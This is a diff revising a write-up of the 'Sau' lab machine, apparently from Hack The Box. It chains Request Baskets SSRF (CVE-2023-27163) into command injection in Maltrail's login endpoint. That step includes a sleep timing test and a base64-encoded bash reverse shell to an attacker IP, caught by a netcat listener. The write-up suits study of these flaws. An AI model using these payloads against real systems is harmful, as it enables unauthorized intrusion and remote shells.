@@ -19,10 +19,10 @@ difficulty: Easy
 ## Reconnaissance
 
 ### Port Scanning
-as usual I started with a full tcp scan 
+I started with a full TCP scan to identify every exposed service.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Sau]
 └──╼ $ sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.55.7 -oN nmap/tcp_scan.nmap 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-30 17:48 CET
 Nmap scan report for 10.129.55.7
@@ -107,7 +107,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 105.63 seconds
 ```
 
-### SSRF on Request Baskets
+## Exploitation
+
+### SSRF in Request Baskets
 
 the scan revealed important information as we can see we have 2 open ports and 2 filtered ports.<br>
 My next move was to check what is running on port 55555 so I opened the URL in my browser.
@@ -118,10 +120,10 @@ before looking for anything I started testing for common things when I found soe
 comes to my mind is ssrf . After creating a basket and clicking on the settings button I found this 
 ![forward url](./assets/forward_url.png)
 
-as we can see in the **Forward URL:** field we can put a url where our basket will forward the requests and acts as proxy. so i ran a python server locally and put my server url in the field and selected the **Proxy Response** option and sent a request to the basket. 
+The **Forward URL** field controls where the basket forwards incoming requests, effectively acting as a proxy. To verify this behavior, I started a local Python HTTP server, entered its URL, enabled **Proxy Response**, and sent a request to the basket.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Sau]
 └──╼ $ curl http://10.129.55.7:55555/p0o77bz
 <!DOCTYPE HTML>
 <html lang="en">
@@ -139,7 +141,7 @@ as we can see in the **Forward URL:** field we can put a url where our basket wi
 ```
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Sau]
 └──╼ $ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.129.55.7 - - [30/Aug/2026 18:11:46] code 404, message File not found
@@ -148,7 +150,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 and we got a hit on our server so we can confirm that the application is vulnerable to ssrf. 
 
-### About CVE-2023-27163
+### CVE-2023-27163
 
 After that i find out that this is **CVE-2023-27163** 
 
@@ -157,12 +159,14 @@ After that i find out that this is **CVE-2023-27163**
 
 you can read more about it [here](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7)
 
-## Shell as puma
+### Exploiting CVE-2023-27163
 
-okay so now we have ssrf vulnerability we can use it to access the filtered port 80 shown in the nmap scan. so i created a new basket and put the **Forward URL:** field to `127.0.0.1`and selected the **Proxy Response** option and sent a request to the basket and saved the html.
+## Shell as `puma`
+
+The confirmed SSRF can reach services that are inaccessible externally, including the filtered service on port `80`. I created another basket, set its **Forward URL** to `http://127.0.0.1`, enabled **Proxy Response**, and saved the returned HTML.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Sau]
 └──╼ $ curl http://10.129.55.7:55555/p0o77bz > index.html
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -172,16 +176,16 @@ Then I opened the file in the browser and found a Maltrail (v0.53) instance runn
 ![maltrail](./assets/maltrail.png)
 
 A simple google search showed that this version is vulnerable to command injection in the **/login** endpoint in the **username** field.<br>
-so I change the **Forward URL:** field to `http://127.0.0.1/login` and sent a post request to the basket . I used time command to detect if the command injection is working or not by sending a sleep command in the username field.
+I changed the **Forward URL** to `http://127.0.0.1/login` and sent a POST request through the basket. To test the login endpoint for blind command injection, I injected a `sleep` command into the username field and measured the response time.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Sau]
 └──╼ $ time curl http://10.129.55.7:55555/p0o77bz --data "username=test"
 Login failed
 real	0m5.441s
 user	0m0.003s
 sys	0m0.009s
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Sau]
 └──╼ $ time curl http://10.129.55.7:55555/p0o77bz --data "username=;`sleep 10`#"
 Login failed
 real	0m15.302s
@@ -197,7 +201,7 @@ username=test;`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjQ3LzQ0NDQgMD4m
 
 and we got a reverse shell as user **puma**.
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Sau]
 └──╼ $ nc -lnvp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.129.55.7 47238
@@ -223,7 +227,7 @@ puma@sau:~$ systemctl --version
 systemd 245 (245.4-4ubuntu3.22)
 ```
 
-### About CVE-2023-26604
+### CVE-2023-26604
 After some research, I found out that this version is vulnerable to **CVE-2023-26604**.
 
 >**Description:**
